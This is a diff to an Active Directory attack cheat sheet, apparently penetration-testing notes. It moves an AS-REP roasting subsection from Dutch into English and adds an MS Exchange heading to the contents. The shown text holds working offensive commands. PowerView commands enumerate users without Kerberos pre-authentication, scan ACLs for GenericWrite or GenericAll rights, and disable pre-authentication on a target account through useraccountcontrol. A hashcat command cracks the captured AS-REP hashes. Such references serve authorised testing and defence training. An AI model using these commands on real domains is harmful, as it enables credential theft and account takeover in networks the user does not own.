@@ -2,7 +2,8 @@
 * [Kerberoast](#Kerberoast) 
   * [Set SPN](#Set-SPN)
 * [AS-REP Roasting](#AS-REP-Roasting) 
-* [Set SPN](#Set-SPN) 
+  * [Set pre-auth not required](#Set-pre---auth-not-required)  
+* [MS Exchange](#MS-Exchange) 
 * [Delegation](#Delegation) 
   * [Unconstrained Delegation](#Unconstrained-delegation) 
   * [Constrained Delegation](#Constrained-delegation) 
@@ -122,18 +123,7 @@ Get-DomainUser -PreauthNotRequired -Verbose
 Get-DomainUser -PreauthNotRequired -verbose | select samaccountname
 ```
 
-#### Enumerate permissions for group
-Met genoeg rechten(GenericWrite of GenericAll) is het mogelijk om kerberos preauth uit te schakelen.
-```
-Invoke-ACLScanner -ResolveGUIDS | Where-Object {$_.IdentityReference -match “<groupname>”}
-Invoke-ACLScanner -ResolveGUIDS | Where-Object {$_.IdentityReference -match “<groupname>”} | select IdentityReference, ObjectDN, ActiveDirectoryRights | fl
-```
 
-#### Set preauth not required
-```
-. ./PowerView_dev.ps1
-Set-DomainObject -Identity <username> -XOR @{useraccountcontrol=4194304} -Verbose
-```
 
 #### Request encrypted AS-REP
 ```
@@ -152,6 +142,21 @@ Edit the hash by inserting '23' after the $krb5asrep$, so $krb5asrep$23$.......
 ```
 Hashcat -a 0 -m 18200 hash.txt rockyou.txt
 ```
+
+### Set preauth not required
+- With enough rights (GenericWrite of GenericAll) it is possible to set pre-auth not required.
+#### Enumerate permissions for group
+```
+Invoke-ACLScanner -ResolveGUIDS | Where-Object {$_.IdentityReference -match “<groupname>”}
+Invoke-ACLScanner -ResolveGUIDS | Where-Object {$_.IdentityReference -match “<groupname>”} | select IdentityReference, ObjectDN, ActiveDirectoryRights | fl
+```
+
+#### Set preauth not required
+```
+. ./PowerView_dev.ps1
+Set-DomainObject -Identity <username> -XOR @{useraccountcontrol=4194304} -Verbose
+```
+
 ## Delegation
 ### Unconstrained Delegation
 #### Discover domain computers which have unconstrained delegation
